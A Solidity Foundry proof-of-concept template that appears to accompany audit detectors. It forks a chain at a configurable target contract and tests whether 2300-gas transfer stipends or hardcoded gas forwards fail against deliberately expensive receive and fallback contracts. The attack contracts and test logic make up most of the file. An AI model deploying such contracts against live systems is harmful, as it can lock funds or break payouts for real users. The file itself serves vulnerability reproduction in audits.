// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Gas assumptions: 2300 stipend + hardcoded gas
/// @notice Detectors: eth-gas-stipend, hardcoded-gas.
///         (a) 2300-gas stipend: transfer() / send() forwards only 2300
///             gas. A recipient whose receive() writes storage needs more
///             -- the payout REVERTS and funds get stuck.
///         (b) Hardcoded gas: the target forwards a fixed gas amount to a
///             callee. After a gas repricing (or against an expensive
///             callee) the call runs out of gas and the flow breaks.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: adapt deposit/withdraw/execute to
///      the target.

contract ExpensiveRecipient {
    uint256 public counter;
    address public immutable victim;

    constructor(address victim_) {
        victim = victim_;
    }

    function deposit() external payable {
        IVictim(victim).deposit{value: msg.value}();
    }

    function withdraw() external {
        IVictim(victim).withdraw();
    }

    // Storage write costs >> 2300 gas -- transfer()/send() cannot pay this.
    receive() external payable {
        counter++;
    }
}

interface IVictim {
    function deposit() external payable;
    function withdraw() external;
}

contract ExpensiveFallback {
    uint256 public counter;

    fallback() external payable {
        // Expensive logic: the fixed-gas forward cannot cover this.
        for (uint256 i = 0; i < 10; i++) {
            counter += i;
        }
    }
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_stipend2300Fails() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 2 ether);

        ExpensiveRecipient recipient = new ExpensiveRecipient(target);
        vm.prank(attackerEOA);
        recipient.deposit{value: 1 ether}();

        // If the target pays via transfer()/send(), this reverts (or the
        // payment silently fails) because receive() costs > 2300 gas.
        (bool ok,) = address(recipient).call(abi.encodeWithSignature("withdraw()"));
        console.log("withdraw to expensive recipient ok:", ok);
        console.log("recipient counter (1 = paid):", recipient.counter());
        assertTrue(!ok || recipient.counter() == 0, "exploit did not reproduce: stipend covered the recipient");
    }

    /// One forward attempt. Success is the CALLEE BEING STARVED (its counter
    /// never advanced) — never the forward call returning. A wrong selector
    /// changes nothing and is not it.
    function _forwardOnce(ExpensiveFallback callee, string memory label, bytes memory data)
        internal
        returns (bool)
    {
        (bool ok,) = target.call(data);
        console.log("tried", label, ok ? "call returned" : "call reverted");
        return ok && callee.counter() == 0;
    }

    function test_hardcodedGasFails() public {
        ExpensiveFallback expensive = new ExpensiveFallback();

        // The forward function is a GUESS on an unverified target, and one wrong
        // name reports "not reproduced" for a vulnerability that exists under
        // another.
        bytes memory payload = bytes("");
        bool reproduced;
        if (!reproduced) reproduced = _forwardOnce(expensive, "execute(address,bytes)", abi.encodeWithSignature("execute(address,bytes)", address(expensive), payload));
        if (!reproduced) reproduced = _forwardOnce(expensive, "call(address,bytes)", abi.encodeWithSignature("call(address,bytes)", address(expensive), payload));
        if (!reproduced) reproduced = _forwardOnce(expensive, "forward(address,bytes)", abi.encodeWithSignature("forward(address,bytes)", address(expensive), payload));
        if (!reproduced) reproduced = _forwardOnce(expensive, "run(address,bytes)", abi.encodeWithSignature("run(address,bytes)", address(expensive), payload));
        if (!reproduced) reproduced = _forwardOnce(expensive, "invoke(address,bytes)", abi.encodeWithSignature("invoke(address,bytes)", address(expensive), payload));

        console.log("expensive callee counter (0 = out of gas):", expensive.counter());
        assertTrue(
            reproduced,
            "no forward entry point starved the callee. Tried execute(address,bytes), call(address,bytes), forward(address,bytes), run(address,bytes), invoke(address,bytes). This does NOT establish safety: the forward function may have another name, take other arguments, or forward enough gas."
        );
    }
}
